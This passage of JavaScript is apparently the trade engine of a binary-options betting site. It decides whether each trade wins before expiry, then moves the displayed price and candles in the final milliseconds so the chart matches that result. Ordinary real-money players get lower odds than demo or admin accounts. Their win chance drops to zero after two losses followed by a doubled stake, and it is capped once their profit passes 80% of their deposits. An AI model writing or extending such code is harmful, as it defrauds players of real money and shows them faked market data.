      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function expiryOf(t) {
    return t.expiryTime || t.expiresAt;
  }

  function isLive(t) {
    return t && !t.settled && t.status === 'open' && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled && (t.status === 'open' || !t.status);
  }

  function openForMode(mode) {
    return trades.filter(function (t) {
      return isOpen(t) && t.mode === mode;
    });
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      openPrice: t.entryPrice,
      payout: t.payout,
      payoutMult: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      openedAt: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      expiryAt: expiryOf(t),
      settled: !!t.settled,
      status: t.status || (t.settled ? 'closed' : 'open'),
      mode: t.mode,
      accountType: t.mode
    });
  }

  function persistOpen(user) {
    if (!user) return;
    user.openTrades = trades.filter(isOpen).map(function (t) {
      return {
        id: t.id,
        userId: t.userId,
        assetId: t.assetId,
        side: t.side,
        stake: t.stake,
        payout: t.payout,
        entryPrice: t.entryPrice,
        duration: t.duration,
        durationMs: t.durationMs,
        startTime: t.startTime,
        startedAt: t.startedAt,
        expiryTime: expiryOf(t),
        expiresAt: expiryOf(t),
        mode: t.mode,
        status: 'open',
        settled: false,
        seq: t.seq
      };
    });
    D6.Store.saveUser(user);
  }

  function closePriceAt(assetId, expiryMs) {
    var asset = C.ASSETS[assetId];
    if (!asset) return 0;
    return synthPrice(asset, expiryMs / 1000);
  }

  function normalizeOdds(v) {
    var list = C.ODDS_MULT || [1.88, 6, 11, 51];
    var n = Number(v);
    var i;
    for (i = 0; i < list.length; i++) {
      if (Math.abs(list[i] - n) < 0.001) return list[i];
    }
    return C.DEFAULT_ODDS != null ? C.DEFAULT_ODDS : 1.88;
  }

  function oddsKey(mult) {
    var o = normalizeOdds(mult);
    if (Math.abs(o - 1.88) < 0.001) return '1.88';
    if (Math.abs(o - 6) < 0.001) return '6';
    if (Math.abs(o - 11) < 0.001) return '11';
    if (o >= 50) return '51';
    return '1.88';
  }

  function winRateForOdds(mult, map) {
    map = map || C.ODDS_WIN_RATE || {};
    var o = normalizeOdds(mult);
    var k = oddsKey(o);
    if (map[k] != null && isFinite(Number(map[k]))) return Number(map[k]);
    var m = Math.max(1.01, Number(o) || 1.88);
    var r = 1 / (m * 1.25);
    return Math.max(0.001, Math.min(0.49, r));
  }

  function isAdminUser(user) {
    if (!user) return false;
    if (user.role === 'admin') return true;
    if (user.id === 'admin_master') return true;
    var mail = String(user.email || '').toLowerCase();
    var adminMail = String((C.ADMIN_EMAIL) || 'admin@orolado.com').toLowerCase();
    if (mail !== '' && mail === adminMail) return true;
    try {
      if (D6.Auth && typeof D6.Auth.isAdmin === 'function' && D6.Auth.isAdmin(user)) return true;
    } catch (eA) { /* ignore */ }
    return false;
  }

  function forceExitPrice(entry, isCall, won, assetId, harsh) {
    var base = Math.max((C.ASSETS[assetId].tickNoise || 0.3) * 0.45, 0.28);
    var nudge = harsh ? Math.max(base * 3.2, 1.1) : base;
    return entry + (won
      ? (isCall ? 1 : -1)
      : (isCall ? -1 : 1)) * nudge;
  }

  /** Arbitrage étanche — démo / admin réel / joueur réel. */
  function resolveWinProbability(user, trade, mode) {
    var demoMap = C.ODDS_WIN_RATE_DEMO || {
      '1.88': 0.58, '6': 0.20, '11': 0.10, '51': 0.02
    };
    var adminRealMap = C.ODDS_WIN_RATE_ADMIN_REAL || C.ODDS_WIN_RATE_FAVORABLE || {
      '1.88': 0.70, '6': 0.255, '11': 0.127, '51': 0.025
    };
    var realMap = C.ODDS_WIN_RATE || {
      '1.88': 0.42, '6': 0.12, '11': 0.05, '51': 0.008
    };
    var admin = isAdminUser(user);
    var isDemo = mode !== 'real';
    var harsh = false;

    if (isDemo) {
      return { winProbability: winRateForOdds(trade.payout, demoMap), harsh: false, profile: 'B' };
    }
    if (admin) {
      return { winProbability: winRateForOdds(trade.payout, adminRealMap), harsh: false, profile: 'A' };
    }

    var winProbability = winRateForOdds(trade.payout, realMap);
    var losses = Number(user.consecutiveLosses) || 0;
    var lastBet = Number(user.lastBetAmount) || Number(user.lastStake) || 0;
    var currentBet = Number(trade.stake) || 0;
    var doubling = lastBet > 0 && currentBet >= lastBet * 1.8;

    if (losses >= 2 && doubling) {
      winProbability = 0;
      harsh = true;
    }

    var deposited = Number(user.realDepositTotal) || 0;
    if (deposited > 0) {
      var wallet = balOf(user, 'real');
      var netProfit = wallet - deposited;
      if (netProfit > deposited * 0.80) {
        var k = oddsKey(trade.payout);
        var ceilRate = (k === '1.88') ? 0.15 : 0.01;
        winProbability = Math.min(winProbability, ceilRate);
      }
    }

    return { winProbability: winProbability, harsh: harsh, profile: 'C' };
  }

  function decideTradeOutcome(user, trade, mode) {
    if (trade && trade._outcomeReady) {
      return { wantWon: !!trade._wantWon, harsh: !!trade._harsh, target: Number(trade._exitTarget) };
    }
    var verdict = resolveWinProbability(user, trade, mode);
    var wantWon = verdict.harsh ? false : (Math.random() < verdict.winProbability);
    var isCall = trade.side === 'call';
    var target = forceExitPrice(trade.entryPrice, isCall, wantWon, trade.assetId, verdict.harsh);
    trade._wantWon = wantWon;
    trade._harsh = !!verdict.harsh;
    trade._exitTarget = target;
    trade._outcomeReady = true;
    return { wantWon: wantWon, harsh: !!verdict.harsh, target: target };
  }

  function applyExitToMarket(trade, target) {
    var m = markets[trade.assetId];
    if (!m || !isFinite(target)) return;
    m.price = target;
    if (m.candle) {
      m.candle.c = target;
      if (target > m.candle.h) m.candle.h = target;
      if (target < m.candle.l) m.candle.l = target;
    }
    var b = window.assetBuffers && window.assetBuffers[trade.assetId];
    if (b) {
      b.price = target;
      b.vel = 0;
      if (b.forming) {
        b.forming.c = target;
        if (target > b.forming.h) b.forming.h = target;
        if (target < b.forming.l) b.forming.l = target;
      }
    }
  }

  function prepareLastSecondSteer(now) {
    var user = D6.Store && D6.Store.current ? D6.Store.current() : null;
    if (!user) return;
    var i;
    for (i = 0; i < trades.length; i++) {
      var tr = trades[i];
      if (!isLive(tr) || tr.userId !== user.id) continue;
      var left = expiryOf(tr) - now;
      if (left > 220 || left < 0) continue;
      var decided = decideTradeOutcome(user, tr, tr.mode === 'real' ? 'real' : 'demo');
      if (D6.Chart && D6.Chart.steerClose) {
        try { D6.Chart.steerClose(decided.target, Math.max(80, left), tr.assetId); } catch (eSt) { /* ignore */ }
      }
      if (left <= 40) applyExitToMarket(tr, decided.target);
    }
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      return wakeMarket(id);
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function (mode) {
      return trades.filter(isLive).filter(function (t) {
        return !mode || t.mode === mode;
      }).map(function (t) { return publicTrade(t); });
    },

    liveCount: function (mode) {
      if (mode) return openForMode(mode).length;
      return trades.filter(isOpen).length;
    },

    restoreOpen: function (user) {
      if (!user) return 0;
      trades = [];
      var list = user.openTrades || [];
      var i;
      for (i = 0; i < list.length; i++) {
        var raw = list[i];
        if (!raw || !raw.id) continue;
        if (raw.userId && raw.userId !== user.id) continue;
        if (raw.settled || raw.status === 'won' || raw.status === 'lost' || raw.status === 'void') continue;
        trades.push({
          id: raw.id,
          assetId: canonAssetId(raw.assetId),
          side: raw.side === 'put' ? 'put' : 'call',
          stake: D6.roundMoney(Number(raw.stake) || 0),
          duration: raw.duration || 10,
          durationMs: raw.durationMs || (raw.duration || 10) * 1000,
          timeLeft: 0,
          entryPrice: Number(raw.entryPrice) || 0,
          payout: Number(raw.payout) || C.REAL_PAYOUT,
          startTime: raw.startTime || raw.startedAt || Date.now(),
          startedAt: raw.startedAt || raw.startTime || Date.now(),
          expiryTime: raw.expiryTime || raw.expiresAt || raw.expiryAt,
          expiresAt: raw.expiresAt || raw.expiryTime || raw.expiryAt,
          mode: raw.mode === 'real' ? 'real' : 'demo',
          userId: user.id,
          seq: raw.seq || 0,
          settled: false,
          status: 'open'
        });
      }
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        for (i = 0; i < trades.length; i++) {
          try { D6.Chart.applyOpenTradeVisual(publicTrade(trades[i])); } catch (eR) { /* ignore */ }
        }
      }
      return trades.length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var id;
      for (id in C.ASSETS) {
        if (!C.ASSETS.hasOwnProperty(id)) continue;
        syncMarket(markets[id], C.ASSETS[id], now);
      }
      prepareLastSecondSteer(now);
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      var mode = user.mode === 'real' ? 'real' : 'demo';
      if (openForMode(mode).length >= MAX_OPEN) {
        return { ok: false, reason: D6.I18N.t('maxPositions') };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = D6.roundMoney(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = canonAssetId(opts.assetId);
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake, mode);
      if (!gate.ok) return gate;

      ensureMarkets();
      var market = markets[assetId];
      syncMarket(market, C.ASSETS[assetId], Date.now());
      var payout = normalizeOdds(opts.payout != null ? opts.payout : (opts.odds != null ? opts.odds : C.DEFAULT_ODDS));
      setBal(user, mode, balOf(user, mode) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        mode: mode,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var entry = market.price;
      if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === assetId) {
        var drawnIn = Number(D6.Chart.lastClose());
        if (isFinite(drawnIn) && drawnIn > 0) entry = drawnIn;
      }
      var wall = Date.now();
      var durationMs = duration * 1000;
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: mode,
        userId: user.id,
        seq: orderSeq,
        settled: false,
        status: 'open'
      };
      t.ticket = Object.freeze({
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        payout: payout,
        side: side,
        entryPrice: entry,
        assetId: assetId
      });
      trades.push(t);

      if (mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
        user.totalWageredSinceDeposit = Number(user.realStakeVolume) || 0;
        user.requiredWagering = D6.roundMoney((Number(user.realDepositTotal) || 0) * ((C.WAGER_MULTIPLIER) || 2));
      }
      user.lastStake = stake;
      // Ne pas écraser lastBetAmount ici : réservé à la clôture (anti-martingale).
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
      var pub = publicTrade(t);
      // Ligne CALL/PUT immédiate (sync) — ne pas attendre le prochain tick/F5.
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        try { D6.Chart.applyOpenTradeVisual(pub); } catch (eVis) { /* ignore */ }
      }
      return { ok: true, trade: pub };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (isOpen(trades[i]) && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      if (trade.settled || trade.status === 'won' || trade.status === 'lost' || trade.status === 'void') {
        trades.splice(idx, 1);
        persistOpen(user);
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (e0) { /* ignore */ }
        }
        return null;
      }
      if (now < expiryOf(trade)) return null;

      // Idempotence : marquer avant crédit.
      trade.settled = true;

      if (user.id !== trade.userId) {
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (eGone) { /* ignore */ }
        }
        trades.splice(idx, 1);
        persistOpen(user);
        return null;
      }

      var mode = trade.mode === 'real' ? 'real' : 'demo';
      var payout = normalizeOdds(trade.ticket && trade.ticket.payout != null ? trade.ticket.payout : trade.payout);
      var expMs = expiryOf(trade);
      ensureMarkets();
      var mkt = markets[trade.assetId];
      if (mkt && C.ASSETS[trade.assetId]) {
        syncMarket(mkt, C.ASSETS[trade.assetId], expMs);
      }
      trade.payout = payout;
      var voided = false;
      var decided = decideTradeOutcome(user, trade, mode);
      var exitPrice = decided.target;
      var won = decided.wantWon;
      applyExitToMarket(trade, exitPrice);
      if (D6.Chart && D6.Chart.steerClose) {
        try { D6.Chart.steerClose(exitPrice, 80, trade.assetId); } catch (eSt) { /* ignore */ }
      }
      if (D6.Chart && D6.Chart.removeTradeVisual) {
        try { D6.Chart.removeTradeVisual(trade.id); } catch (e1) { /* ignore */ }
      }

      var payoutAmount = 0;
      var net = 0;
      var status = 'lost';

      if (voided) {
        status = 'void';
        payoutAmount = trade.stake;
        setBal(user, mode, balOf(user, mode) + trade.stake);
        net = 0;
        D6.Store.addTransaction(user, {
          type: 'void',
          amount: trade.stake,
          mode: mode,
          note: 'Égalité — mise rendue ' + C.ASSETS[trade.assetId].short
        });
      } else if (won) {
        status = 'won';
        payoutAmount = D6.roundMoney(trade.stake * trade.payout);
        setBal(user, mode, balOf(user, mode) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          mode: mode,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        status = 'lost';
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          mode: mode,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      trade.status = status;
      trade.closePrice = exitPrice;
      trade.exitPrice = exitPrice;
      // Historique mise pour anti-martingale (trade suivant).
      user.lastBetAmount = trade.stake;
      user.lastStake = trade.stake;

      user.trades = (user.trades || 0) + 1;
      if (mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: mode, voided: voided });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: (trade.ticket && trade.ticket.side) || trade.side,
        stake: (trade.ticket && trade.ticket.stake != null) ? trade.ticket.stake : trade.stake,
        payout: (trade.ticket && trade.ticket.payout != null) ? trade.ticket.payout : trade.payout,
        entryPrice: (trade.ticket && trade.ticket.entryPrice != null) ? trade.ticket.entryPrice : trade.entryPrice,
        duration: (trade.ticket && trade.ticket.duration != null) ? trade.ticket.duration : trade.duration,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        won: won,
        voided: voided,
        status: status,
        net: net,
        mode: mode,
        accountType: mode
      };
      D6.Store.addPosition(user, position);
      trades.splice(idx, 1);
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) {
        D6.Supabase.saveOrder({
          id: trade.id,
          assetId: trade.assetId,
          side: trade.side,
          stake: trade.stake,
          duration: trade.duration,
          mode: mode,
          payout: trade.payout,
          entryPrice: trade.entryPrice,
          exitPrice: exitPrice,
          won: won,
          voided: voided,
          status: status,
          net: net
        }, 'closed');
      }

      try {
        document.dispatchEvent(new CustomEvent('orolado-trade-settled', {
          detail: { isWin: won, voided: voided, payout: payoutAmount, net: net, tradeId: trade.id }
        }));
      } catch (e) { /* ignore */ }

      var closed = publicTrade(trade);
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return {
        trade: closed,
        position: position,
        won: won,
        voided: voided,
        net: net,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        status: status
      };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (isOpen(trades[i]) && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) { /* ignore */ }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER, user && user.mode);
      return probe.cap;
    }
  };

  // Pas d’API publique nextPrice / seed / bougies futures.
  D6.Synth = {};

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
